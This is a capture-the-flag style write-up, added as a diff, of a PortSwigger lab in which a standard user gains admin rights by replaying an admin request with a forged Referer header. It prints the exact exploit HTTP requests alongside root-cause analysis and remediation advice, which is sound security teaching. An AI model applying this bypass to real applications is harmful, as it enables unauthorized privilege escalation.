@@ -1,0 +1,377 @@
+# Referer-Based Access Control Bypass
+
+**Lab:** Referer-based access control  
+**Category:** Broken Access Control  
+**Difficulty:** Apprentice  
+**Platform:** PortSwigger Web Security Academy
+
+---
+
+# Executive Summary
+
+The application attempted to protect privileged functionality by verifying the value of the HTTP `Referer` header instead of validating the authenticated user's privileges.
+
+Although direct requests to the administrative endpoint were rejected due to the absence of the expected `Referer`, an attacker could capture a legitimate administrative request, replace the administrator's session with a standard user's session, preserve the trusted `Referer`, and successfully execute the administrative action.
+
+This resulted in a complete privilege escalation.
+
+---
+
+# Vulnerability Classification
+
+| Attribute | Value |
+|-----------|-------|
+| Vulnerability | Referer-Based Access Control Bypass |
+| CWE | CWE-285 – Improper Authorization |
+| CWE | CWE-602 – Client-Side Enforcement of Server-Side Security |
+| OWASP Top 10 | A01:2021 – Broken Access Control |
+| Severity | High |
+| CVSS v3.1 | 8.8 (High) |
+
+---
+
+# Target
+
+**Application:** PortSwigger Web Security Academy Lab
+
+**Affected Endpoint**
+
+```http
+GET /admin-roles
+```
+
+---
+
+# Objective
+
+Escalate the privileges of a standard user account by abusing an authorization mechanism that trusts the `Referer` header.
+
+---
+
+# Methodology
+
+1. Authenticate as the administrator.
+2. Access the administration panel.
+3. Capture the request used to promote a user.
+4. Authenticate as a standard user.
+5. Verify that direct access to the endpoint is denied.
+6. Replay the captured request.
+7. Replace the administrator session cookie.
+8. Modify the target username.
+9. Execute the privileged action.
+
+---
+
+# Initial Enumeration
+
+After logging in as the administrator, the administration panel exposed a feature to promote users.
+
+Selecting **Upgrade user** for **carlos** generated the following request:
+
+```http
+GET /admin-roles?username=carlos&action=upgrade HTTP/2
+Host: LAB-ID.web-security-academy.net
+Cookie: session=<ADMIN_SESSION>
+Referer: https://LAB-ID.web-security-academy.net/admin
+```
+
+The request was intercepted and sent to Burp Repeater.
+
+---
+
+# Authorization Validation
+
+A new browser session was opened using the low-privileged account.
+
+The administrative endpoint was requested directly:
+
+```http
+GET /admin-roles?username=carlos&action=upgrade HTTP/2
+Host: LAB-ID.web-security-academy.net
+Cookie: session=<USER_SESSION>
+```
+
+The application returned:
+
+```http
+HTTP/2 401 Unauthorized
+```
+
+or
+
+```text
+Unauthorized
+```
+
+This indicated that the request was rejected because it lacked the expected `Referer` header.
+
+---
+
+# Exploitation
+
+The captured administrative request was modified.
+
+The administrator session:
+
+```http
+Cookie: session=<ADMIN_SESSION>
+```
+
+was replaced with the standard user's session:
+
+```http
+Cookie: session=<USER_SESSION>
+```
+
+The parameter:
+
+```text
+username=carlos
+```
+
+was changed to:
+
+```text
+username=wiener
+```
+
+The trusted `Referer` header was preserved:
+
+```http
+Referer: https://LAB-ID.web-security-academy.net/admin
+```
+
+Final request:
+
+```http
+GET /admin-roles?username=wiener&action=upgrade HTTP/2
+Host: LAB-ID.web-security-academy.net
+Cookie: session=<USER_SESSION>
+Referer: https://LAB-ID.web-security-academy.net/admin
+```
+
+The server accepted the request and promoted the standard user to administrator.
+
+The laboratory was solved.
+
+---
+
+# Technical Analysis
+
+The application appears to authorize requests using logic similar to:
+
+```php
+if (strpos($_SERVER['HTTP_REFERER'], "/admin") === false) {
+    exit("Unauthorized");
+}
+
+upgradeUser($_GET['username']);
+```
+
+Instead of validating the authenticated user's permissions, the server trusts that requests originating from the administration panel are legitimate.
+
+Since the `Referer` header is fully controlled by the client, this mechanism provides no real security.
+
+---
+
+# Root Cause
+
+The application relied on a client-controlled HTTP header to make authorization decisions.
+
+No verification was performed to ensure that the authenticated user actually possessed administrator privileges before executing the privileged action.
+
+---
+
+# Impact
+
+An attacker can:
+
+- Escalate privileges.
+- Promote arbitrary users.
+- Gain administrator access.
+- Execute privileged administrative functions.
+- Fully compromise the application.
+
+---
+
+# HTTP Evidence
+
+## Legitimate Administrative Request
+
+```http
+GET /admin-roles?username=carlos&action=upgrade HTTP/2
+Host: LAB-ID.web-security-academy.net
+Cookie: session=<ADMIN_SESSION>
+Referer: https://LAB-ID.web-security-academy.net/admin
+```
+
+---
+
+## Direct Access Attempt
+
+```http
+GET /admin-roles?username=carlos&action=upgrade HTTP/2
+Host: LAB-ID.web-security-academy.net
+Cookie: session=<USER_SESSION>
+```
+
+Response:
+
+```text
+Unauthorized
+```
+
+The absence of the `Referer` header caused the request to be rejected.
+
+---
+
+## Final Exploit
+
+```http
+GET /admin-roles?username=wiener&action=upgrade HTTP/2
+Host: LAB-ID.web-security-academy.net
+Cookie: session=<USER_SESSION>
+Referer: https://LAB-ID.web-security-academy.net/admin
+```
+
+The request succeeded and promoted the low-privileged user.
+
+---
+
+# Attack Flow
+
+```text
+Administrator
+      │
+      ▼
+Accesses /admin
+      │
+      ▼
+Generates legitimate request
+      │
+      ▼
+Attacker captures request
+      │
+      ▼
+Replaces administrator session
+      │
+      ▼
+Changes username parameter
+      │
+      ▼
+Preserves Referer header
+      │
+      ▼
+Server trusts Referer
+      │
+      ▼
+Administrative action executed
+      │
+      ▼
+Privilege escalation
+```
+
+---
+
+# Root Cause Diagram
+
+```text
+Incoming Request
+       │
+       ▼
+Referer == /admin ?
+       │
+      Yes
+       │
+       ▼
+Execute Administrative Action
+       │
+       ▼
+❌ No verification of administrator privileges
+```
+
+---
+
+# Security Recommendations
+
+## Never Use `Referer` for Authorization
+
+The `Referer` header is supplied by the client and can be modified, removed, or forged.
+
+It must never be used as a security control.
+
+---
+
+## Perform Server-Side Authorization
+
+Every privileged endpoint should verify that the authenticated user has the required permissions.
+
+Example:
+
+```php
+if (!$currentUser->isAdmin()) {
+    http_response_code(403);
+    exit();
+}
+```
+
+---
+
+## Protect Every Administrative Endpoint
+
+Authorization checks must be enforced on:
+
+- Administrative pages.
+- APIs.
+- AJAX endpoints.
+- Confirmation requests.
+- Background actions.
+
+---
+
+## Do Not Trust Client-Controlled Headers
+
+The following headers should never be used to authorize users:
+
+- Referer
+- Origin
+- User-Agent
+- X-Forwarded-For
+- X-Original-URL
+
+---
+
+## Centralize Authorization Logic
+
+Implement authorization through middleware or a centralized security layer to ensure consistent enforcement across all privileged functionality.
+
+---
+
+# References
+
+- OWASP Top 10 2021 – A01: Broken Access Control
+- CWE-285 – Improper Authorization
+- CWE-602 – Client-Side Enforcement of Server-Side Security
+- PortSwigger Web Security Academy – Access Control Vulnerabilities
+
+---
+
+# Conclusion
+
+The application was vulnerable to a **Referer-Based Access Control Bypass** because it relied on the `Referer` header to authorize privileged actions instead of validating the authenticated user's permissions.
+
+By replaying a legitimate administrative request with a standard user's session while preserving the trusted `Referer`, an attacker could successfully perform administrative operations and escalate privileges.
+
+---
+
+## Key Takeaways
+
+- The `Referer` header is entirely controlled by the client and must never be trusted for authorization.
+- Every privileged endpoint must independently validate user permissions.
+- Authorization must always be enforced server-side.
+- Client-supplied HTTP headers should never determine access to sensitive functionality.
+- Broken Access Control remains one of the most critical vulnerabilities affecting modern web applications.
+
+---
+
+**Lab Status:** ✅ Solved
